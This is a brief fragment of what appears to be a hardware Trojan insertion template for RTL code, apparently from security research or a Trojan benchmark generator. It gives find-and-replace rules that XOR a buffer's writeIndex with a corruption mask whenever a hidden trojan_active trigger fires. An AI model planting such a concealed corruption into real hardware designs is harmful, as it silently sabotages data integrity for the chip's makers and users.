 ...
 * Payload: Corrupt writeIndex with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt writeIndex with XOR
//
// Integration Script Must Modify:
//
// IF writeIndex is assigned:
//   Find: assign writeIndex = data_value;
//   Replace: assign writeIndex = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF writeIndex is in always_ff:
//   Find: writeIndex <= data_value;
//   Replace: writeIndex <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
